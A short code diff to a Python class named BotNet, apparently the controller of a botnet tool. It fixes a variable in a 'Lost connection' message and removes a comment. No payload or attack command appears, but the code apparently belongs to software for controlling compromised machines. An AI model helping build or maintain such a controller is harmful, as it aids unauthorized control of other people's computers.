@@ -31,8 +31,7 @@ class BotNet(Thread):
             if user in self.allConnections:
                  # terminate and remove
                 self.socketio.emit('disconnect', {'user': user}, namespace='/bot')
-                print("[-] Lost connection to {}".format(bot.user))
-            # Notify recv thread
+                print("[-] Lost connection to {}".format(user))
 
     def getConnection(self,user):
         with self.connlock:
